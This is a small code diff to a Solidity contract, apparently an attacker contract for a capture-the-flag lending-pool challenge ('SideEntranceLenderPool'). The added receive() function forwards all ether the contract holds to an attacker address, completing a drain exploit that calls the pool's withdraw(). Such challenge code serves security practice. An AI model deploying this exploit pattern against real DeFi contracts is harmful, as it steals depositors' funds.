@@ -45,6 +45,10 @@ contract FlashLoanEtherReceiver {
         ISideEntranceLenderPool(_vulnerableContract).withdraw();
     }
 
+    receive() external payable {
+        payable(_attacker).sendValue(address(this).balance);
+    }
+
     fallback() external payable {
         payable(_attacker).sendValue(address(this).balance);
     }
